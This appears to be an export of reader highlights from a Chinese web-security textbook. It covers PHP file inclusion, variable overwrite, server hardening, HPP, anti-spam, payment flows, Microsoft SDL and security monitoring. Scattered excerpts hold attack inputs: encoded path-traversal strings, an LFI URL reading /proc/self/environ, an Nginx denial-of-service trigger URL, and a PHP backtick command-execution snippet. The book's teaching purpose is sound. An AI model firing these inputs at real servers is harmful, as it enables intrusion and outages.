文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。PHP:include(), include_once(), require(), require_once(), fopen(), readfile(), ...JSP/Servlet:ava.io.File(), java.io.FileReader(), ...ASP:include file, include virtual, ...在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了
 
 
PHP的一种常见用法，主要由4个函数完成：include()require()include_once()require_once()当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型
 
 
文件包含漏洞，需要满足下面两个条件：（1）include()等函数通过动态变量的方式引入需要包含的文件；（2）用户能够控制该动态变量。
 
 
（Local File Inclusion，简称LFI）。比如下面这段代码，就存在LFI漏洞。 
 
 
PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串
 
 
利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在Windows下256字节、Linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。如何构造出这么长的目录呢？通过“./”的方式即可，比如： ./././././././././././././abc或者 /////////////////abc
 
 
“目录遍历”（Path Traversal）。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端逻辑。❍ %2e%2e%2f等同于 ．./❍ %2e%2e/等同于．./❍ ..%2f等同于．./❍ %2e%2e%5c等同于．.\❍ %2e%2e\等同于．.\❍ ..%5c等同于．.\❍ %252e%252e%255c等同于．.\❍ ..%255c等同于．.\ and so on.某些Web容器支持的编码方式：❍ ..%c0%af等同于 ．./❍ ..%c1%9c等同于 ．.\比如CVE-2008-2938，就是一个Tomcat的目录遍历漏洞。
 
 
要限定一个指定的目录，则需要在最后加上“/”。 open_basedir = /home/app/aaa/
 
 
如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的
 
 
安全研究者总结出了以下几种常见的技巧，用于本地文件包含后执行PHP代码。（1）包含用户上传的文件。（2）包含data:// 或php://input等伪协议。（3）包含Session文件。（4）包含日志文件，比如Web Server的access log。（5）包含/proc/self/environ文件。（6）包含上传的临时文件（RFC1867）。（7）包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。
 
 
Session文件的条件也较为苛刻，它需要攻击者能控制部分Session文件的内容。比如：x|s:19:""
 
 
PHP的错误回显没有关闭，那么构造一些异常也许能够暴露出Web目录所在位置。此外，还可以利用下面的方法。包含/proc/self/environ是一种更为通用的方法，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容。 http://www.website.com/view.php? page=../../../../../proc/self/environ
 
 
[插图]PHP处理上传文件的过程PHP会为上传文件创建临时文件，其目录在php.ini的upload_tmp_dir中定义。但该值默认为空，此时在Linux下会使用/tmp目录，在Windows下会使用C:\windows\temp目录。
 
 
PHP在此处并没有使用安全的随机函数，因此使得暴力猜解文件名成为可能。在Windows下，仅有65535种不同的文件名。
 
 
通过$GLOBALS获取的变量，也可能导致变量覆盖。
 
 
xtract()变量覆盖extract()函数能将变量从数组导入当前的符号表
 
 
安全的做法是确定register_globals = OFF后，在调用extract() 时使用EXTR_SKIP保证已有变量不会被覆盖。
 
 
arse_str()变量覆盖 void parse_str ( string $str [, array &$arr ] )parse_str()函数往往被用于解析URL的query string，但是当参数值能被用户控制时，很可能导致变量覆盖。
 
 
if (strstr($_SERVER['QUERY_STRING'], 'session_to_unset') ! = false) { parse_str($_SERVER['QUERY_STRING']); session_write_close(); session_id($session_to_unset); session_start(); $_SESSION = array(); session_write_close(); session_destroy(); exit; }这是一个典型的通过parse_str() 覆盖变量的漏洞，但是这个函数的逻辑很短，到最后直接就exit了，原本做不了太多事情。但是注意到Session变量是可以保存在服务器端
 
 
能够往本地文件里写入内容的函数都需要重点关注。这样的函数较多，常见的有file_put_contents()、fwrite()、fputs()等。在上节中就举了一个写入本地文件导致代码执行的案例。
 
 
在代码审计时要注意这种“组合类”漏洞。preg_replace()代码执行preg_replace()的第一个参数如果存在/e模式修饰符，则允许代码执行。
 
 
Curly SyntaxPHP的Curly Syntax也能导致代码执行，它将执行花括号间的代码，并将结果替换回
 
 
$var = "I was innocent until ${`ls`} appeared here"; ?>ls命令将列出本地目录的文件，并将结果返回。如下例，phpinfo()函数将执行：
第15章 Web Server配置安全
 
pache以root身份或者admin身份运行是一个非常糟糕的决定。这里的admin身份是指服务器管理员在管理机器时使用的身份
 
 
Apache的结果可能是灾难性的，它会带来两个可怕的后果：（1）当黑客入侵Web成功时，将直接获得一个高权限（比如root或admin）的shell；（2）应用程序本身将具备较高权限，当出现bug时，可能会带来较高风险，比如删除本地重要文件、杀死进程等不可预知的结果。
 
 
要做的第一件事情就是清除入侵痕迹，修改、删除日志文件，因此access log应当妥善保管，比如实时地发送到远程的syslog服务器上。
 
 
比如CVE-2010-2266是一个Nginx的拒绝服务漏洞，触发条件非常简单： http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20 http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%c0.%c0./%20 http://[ webserver IP][:port]/%c0.%c0./%c0.%c0./%20因此多多关注Nginx的漏洞信息
 
 
Boss是J2EE环境中一个流行的Web容器，但是jBoss在默认安装时提供的一些功能却不太安全，如果配置不得当，则可能直接造成远程命令执行
 
 
Apache Tomcat与jBoss一样，默认也会运行在8080端口。它提供的Tomcat Manager的作用与JMX-Console类似，管理员也可以在Tomcat Manager中部署war包。
 
 
HTTP Parameter Pollution在2009年的OWASP大会上，Luca、Carettoni等人演示了这种被称为HPP的攻击。简单来说，就是通过GET或POST向服务器发起请求时，提交两个相同的参数
 
 
比如．net环境中，则会变成： a=test, test1这种特性在绕过一些服务器端的逻辑判断时，会非常有用。
 
 
HPP的发现者，在测试了大量服务器软件版本的组合后，整理出下表，作为参考。[插图]
第四篇 互联网公司安全运营
 
“提高密码复杂度”这个安全需求，其本质其实可以分解为：（1）如何对抗暴力破解；（2）如何防止密码中包含个人信息。这样，设计安全方案的思路就有了一些变化。
 
 
如果我们的产品能够潜移默化地培养用户的安全习惯，将用户往更安全的行为上引导，那么这样的安全就是最理想的产品安全。
 
 
网站如果将用户的ID显示在网页上，那么就有可能被黑客抓取，黑客可以实施一种恶意攻击，使用一个脚本不停地尝试登录所有的ID。这样，正常的用户都会被系统锁定。如果大多数的用户都无法正常登录网站，那么网站的业务会受到非常大的影响。这种攻击针对的是安全三要素中的“可用性”。很多网站在设计对抗暴力破解的方案时，都会使用“锁定账户”的策略，其实都会存在这样的逻辑缺陷。
 
 
根据DREAD模型（参见“我的安全世界观”一章），可以得出如下的风险判断。（按照风险从高到低排列）（1）网站被暴力破解D(3)+R(3)+E(3)+A(3)+D(3) = 15（2）密码取回流程存在逻辑漏洞D(3)+R(3)+E(3)+A(3)+D(2) = 14（3）密码被嗅探D(3)+R(3)+E(3)+A(1)+D(3) = 13（4）网站存在SQL注入漏洞D(3)+R(3)+E(2)+A(3)+D(1) = 12（5）用户被钓鱼D(3)+R(1)+E(3)+A(2)+D(3) = 12（6）网站存在XSS，账户被间接窃取D(3)+R(2)+E(2)+A(2)+D(2) = 11（7）用户中木马D(3)+R(1)+E(2)+A(1)+D(1) = 8尽管风险的判断存在一定的主观因素，但DREAD模型还是能帮助我们更清楚地认识到目前的问题所在
 
 
垃圾注册和垃圾消息的内容去分析，又可以发现很多不同的特点：（1）注册时填写的用户名可能是随机生成的字符串，而非自然语言；（2）不同账户的资料介绍可能出现同样的内容，在需要打广告时尤其如此；（3）可能含有一些敏感词，比如政治敏感词和商业广告词；（4）可能出现文字的变形，比如把半角变全角，或者类似地把“强”拆成“弓虽”。
 
 
在垃圾识别或者Anti-Spam领域里，被广泛应用的方法是“机器学习”。
 
 
大部分都是基于域名策略的，比如SPF（Sender Policy Framework）、Yahoo的DomainKeys、微软的Sender ID技术等。Yahoo的DomainKeys会生成一对公私钥。公钥布署在收信方的DNS服务器上，用于解密；私钥则用于发信方的邮件服务器，对发出的每封邮件进行签名。这样收信方在收信时，到DNS服务器上查询属于发信方域名的公钥，并对邮件中的加密串进行解密验证，以确保该邮件来自正确域
 
 
SPF是基于IP策略的，有点类似于DNS反向解析。收信方在接收到邮件时，会去DNS查询发信方域的SPF记录。这个记录写着发信方邮件服务器和IP的对应关系，检查了这个记录后，就可以确定该邮件是不是发自指定IP的邮件服务器，从而判断邮件真伪。微软的Sender ID技术，是以SPF为基础的。
 
 
商户（比如淘宝网）→ 第三方支付平台（比如支付宝、yeepay）→网上银行（比如工商银行）这实际上是一个跨平台传递信息的过程。贯穿不同平台的唯一标识，是订单号。订单中只包含了商品信息，但缺少创建订单用户的相关信息。这是网上支付流程中存在的一个重大设计缺陷。
 
 
完成了这个订单的支付，银行端其实是不知道的。银行只知道这个订单是否已被支付完成，而不知道是谁支付了订单。
 
 
Do-Not-Track本身并不受欢迎。Yahoo、Google等互联网巨头均对Do-Not-Track表示了一定的抵制，
第17章 安全开发流程（SDL）
 
Secure at the Source”的战略思想。实施好安全开发流程
 
 
执行修复的30倍。Forrester Research, Inc． 和Aberdeen Group研究发现，如果公司采用像Microsoft SDL这样的结构化过程，就可以在相应的开发阶段系统地处理软件安全问题
 
 
微软的SDL过程大致分为16个阶段（优化后）。阶段1：培训开发团队的所有成员都必须接受适当的安全培训
 
 
阶段2：安全要求在项目确立之前，需要提前与项目经理或者产品owner进行沟通，确定安全的要求和需要做的事情
 
 
阶段3：质量门/bug栏质量门和bug栏用于确定安全和隐私质量的最低可接受级别。
 
 
阶段4：安全和隐私风险评估安全风险评估（SRA）和隐私风险评估（PRA）是一个必需的过程，
 
 
阶段5：设计要求在设计阶段应仔细考虑安全和隐私问题，在项目初期确定好安全需求，尽可能避免安全引起的需求变更。阶段6：减小攻击面减小攻击面与威胁建模紧密相关，不过它解决安全问题的角度稍有不同。
 
 
阶段7：威胁建模为项目或产品面临的威胁建立模型，明确可能来自的攻击有哪些方面。
 
 
阶段8：使用指定的工具开发团队使用的编译器、链接器等相关工具
 
 
阶段9：弃用不安全的函数许多常用函数可能存在安全隐患，应该禁用不安全的函数或AP
 
 
阶段10：静态分析代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。阶段11：动态程序分析动态分析是静态分析的补充，用于测试环节验证程序的安全性。阶段12：模糊测试（Fuzzing Test）模糊测试是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障
 
 
阶段13：威胁模型和攻击面评析项目经常会因为需求变更等因素导致最终的产出偏离原本设定的目标
 
 
阶段14：事件响应计划受SDL要求约束的每个软件在发布时都必须包含事件响应计划。
 
 
阶段15：最终安全评析最终安全评析（FSR）是在发布之前仔细检查对软件执行的所有安全活动。通过FSR将得出以下三种不同结果。
 
 
阶段16：发布/存档在通过FSR或者虽有问题但达成一致后，可以完成产品的发布。
 
 
相对于微软的SDL, OWASP推出了SAMM（Software Assurance Maturity Model）[插图]，帮助开发者在软件工程的过程中实施安全
 
 
敏捷SDL的思想其实就是以变化的观点实施安全的工作
 
 
skipfish[插图]是Google使用的一款Web安全扫描器，Google开放了其源代码：
第18章 安全运营
 
开源的监控系统Nagios。
 
 
是探测网站或网站的用户是否被攻击，是否发生了DDOS，从而可以做出反应。
 
 
常见的安全监控产品有IDS（入侵检测系统）、IPS（入侵防御系统）、DDOS监控设备等。在IDS这个大家族中，Web应用防火墙（简称WAF）
 
 
另一个同样著名的开源WAF是PHPIDS[插图]。PHPIDS是为PHP应用设计的一套入侵检测系统
 
 
报警是一种主动通知管理员的提醒方式。常见的报警方式有三种。（1）邮件报警这是成本最低的报警方式，建立一个SMTP服务器就可以发送报警邮件。
 
 
2）IM报警通过调用一些IM的API，可以实现IM报警。
 
 
（3）短信报警随着手机的普及，短信报警也成为越来越重要的一种报警方式
 
 
小组成员需要包括：❍ 技术负责人❍ 产品负责人❍ 最了解技术架构的资深开发工程师❍ 资深网络工程师❍ 资深系统运维工程师❍ 资深DBA❍ 资深安全专家❍ 监控工程师❍ 公司公关
微信读书

